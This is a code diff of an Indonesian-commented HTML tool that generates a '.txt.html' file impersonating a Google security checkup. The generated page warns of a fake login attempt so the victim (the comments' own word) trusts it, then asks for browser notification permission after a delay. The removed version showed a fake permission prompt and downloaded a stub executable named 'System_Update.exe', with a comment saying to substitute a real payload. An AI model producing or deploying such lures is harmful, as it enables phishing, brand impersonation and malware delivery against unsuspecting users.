@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Android Permission Spoofing (Delay)</title>
+<title>Google Security Notification</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -15,103 +15,74 @@ p { margin-bottom: 15px; line-height: 1.5; }
 button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
 button:hover { background: #b71c1c; }
 #status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
-#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
-#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Android Permission Spoofing</h2>
-<p>Membuat file .txt.html yang saat dibuka di Android akan menampilkan Fake Notification Prompt setelah delay.</p>
+<h2>Delayed Browser Permission</h2>
+<p>Mengunduh file yang akan memicu prompt izin notifikasi asli dari browser setelah jeda waktu (delay).</p>
 
-<button id="start-btn" type="button">Mulai Generate Blob</button>
+<button id="start-btn" type="button">Generate File .txt.html</button>
 <div id="status" role="status">Sistem siap.</div>
-<div id="downloads"></div>
 </div>
 
 <script>
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
 
 let activeUrls = [];
 let isProcessing = false;
-
-const speak = (message) => {
-    if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-        const utterance = new SpeechSynthesisUtterance(message);
-        utterance.lang = 'id-ID';
-        utterance.rate = 1.0;
-        window.speechSynthesis.speak(utterance);
-    }
-};
 
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>System Settings</title></head>" +
-            "<body style='margin:0;padding:0;background:#000;color:#fff;font-family:sans-serif;overflow:hidden;'>" +
+            "<head><meta charset='UTF-8'><title>Google Account Security</title></head>" +
+            "<body style='margin:0;padding:0;background:#f9f9f9;color:#333;font-family:\"Segoe UI\", Roboto, sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
             
-            // BACKGROUND (Bikin seolah-olah halaman utama sedang loading)
-            "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;opacity:0.3;'>" +
-            "    <h1 style='font-size:40px;color:#fff;'>Settings</h1>" +
-            "    <p>Memuat konfigurasi...</p>" +
-            "</div>" +
-
-            // FAKE NOTIFICATION PROMPT (Tersembunyi awalnya)
-            "<div id='fake-prompt' style='display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center;'>" +
-            "    <div style='background:#fff; color:#000; width:85%; max-width:350px; border-radius:12px; padding:20px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.5); font-family:Roboto, sans-serif;'>" +
-            "        <img src='https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg' style='width:40px; margin-bottom:10px;'>" +
-            "        <h3 style='margin-bottom:10px; font-size:18px;'>Allow Notifications?</h3>" +
-            "        <p style='font-size:14px; color:#555; margin-bottom:20px;'>Google wants to send you notifications about security updates and account activity.</p>" +
-            "        <div style='display:flex; justify-content:space-between; gap:10px;'>" +
-            "            <button id='btn-deny' style='flex:1; padding:10px; border:none; background:#f0f0f0; color:#333; border-radius:6px; font-weight:bold;'>Block</button>" +
-            "            <button id='btn-allow' style='flex:1; padding:10px; border:none; background:#0078d4; color:#fff; border-radius:6px; font-weight:bold;'>Allow</button>" +
-            "        </div>" +
-            "    </div>" +
+            // Halaman tiruan Google (supaya korban percaya)
+            "<div style='background:#fff;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);max-width:400px;text-align:center;border:1px solid #dadce0;'>" +
+            "    <img src='https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg' style='width:60px; margin-bottom:20px;'>" +
+            "    <h2 style='font-size:22px; font-weight:400; color:#202124; margin-bottom:10px;'>Security Checkup</h2>" +
+            "    <p style='font-size:14px; color:#5f6368; line-height:1.5; margin-bottom:30px;'>We noticed a new login attempt. Please verify your identity to secure your account.</p>" +
+            "    <p id='status' style='color:#1a73e8; font-size:14px; font-weight:bold;'>Memuat verifikasi...</p>" +
             "</div>" +
 
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
 
-            // DELAY SPOOFING: Tunggu 1.5 detik sebelum menampilkan prompt palsu
+            // DELAY LOGIC: Tunggu 3 detik sebelum meminta izin asli dari browser
             "setTimeout(function() {" +
-            "    var prompt = document.getElementById('fake-prompt');" +
-            "    prompt.style.display = 'flex';" +
-            "}, 1500);" +
+            "    var statusEl = document.getElementById('status');" +
+            "    statusEl.textContent = 'Meminta izin notifikasi...';" +
+            
+            "    if (!('Notification' in window)) {" +
+            "        statusEl.textContent = 'Browser tidak mendukung notifikasi.';" +
+            "        return;" +
+            "    }" +
 
-            // LOGIKA TOMBOL
-            "document.getElementById('btn-allow').addEventListener('click', function() {" +
-            "    document.getElementById('fake-prompt').style.display = 'none';" +
-            "    alert('Izin Notifikasi Diberikan (Palsu). Mengunduh Payload...');" +
-            "    picuDownload();" + // Pemicu unduhan
-            "});" +
-
-            "document.getElementById('btn-deny').addEventListener('click', function() {" +
-            "    document.getElementById('fake-prompt').style.display = 'none';" +
-            "});" +
-
-            // FUNGSI UNDUH (Payload APK/EXE)
-            "var sudah = false;" +
-            "function picuDownload(){" +
-            "    if (sudah) return;" +
-            "    sudah = true;" +
-            "    try{" +
-            "        var blob = new Blob(['MZ\\x90\\x00'], { type: 'application/octet-stream' });" + // Ganti dengan b64Data asli jika perlu
-            "        var url = URL.createObjectURL(blob);" +
-            "        var a = document.createElement('a');" +
-            "        a.href = url;" +
-            "        a.download = 'System_Update.exe';" +
-            "        a.style.display = 'none';" +
-            "        document.body.appendChild(a);" +
-            "        a.click();" +
-            "    } catch(e){}" +
-            "}" +
+            // Memicu prompt izin asli dari browser
+            "    Notification.requestPermission().then(function(permission) {" +
+            "        if (permission === 'granted') {" +
+            "            statusEl.textContent = 'Akses diberikan. Memverifikasi...';" +
+            "            " +
+            // Jika korban mengklik 'Allow', tampilkan notifikasi asli dari browser
+            "            new Notification('Google Security Alert', {" +
+            "                body: 'Akun Anda berhasil diamankan.'," +
+            "                icon: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'," +
+            "                tag: 'google-security'" +
+            "            });" +
+            "        } else {" +
+            "            statusEl.textContent = 'Izin ditolak. Proses dibatalkan.';" +
+            "        }" +
+            "    }).catch(function(err) {" +
+            "        statusEl.textContent = 'Error: ' + err.message;" +
+            "    });" +
+            
+            "}, 3000);" + // Jeda 3000ms (3 detik)
 
             "})();" +
             "<\/script>" +
@@ -128,8 +99,8 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    link.download = `update-paket.txt.html`;
-    link.textContent = `Download update-paket.txt.html`;
+    link.download = `account-security-${fileData.id}.txt.html`;
+    link.textContent = `Download account-security.txt.html`;
     link.style.display = "none";
     document.body.appendChild(link);
     link.click();
@@ -142,8 +113,6 @@ startBtn.addEventListener("click", () => {
     startBtn.disabled = true;
     statusDiv.textContent = "Menyiapkan file...";
 
-    speak("Menyiapkan file Permission Spoofing.");
-
     const root = document.documentElement;
     try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}
 
@@ -152,7 +121,7 @@ startBtn.addEventListener("click", () => {
             const fileData = await prepareMimeBlobAsync(1);
             activeUrls.push(fileData.url);
             triggerInstantDownload(fileData);
-            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html di Android Anda.";
+            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html di HP Anda.";
         } catch(e) {
             statusDiv.textContent = "Gagal: " + e.message;
         }
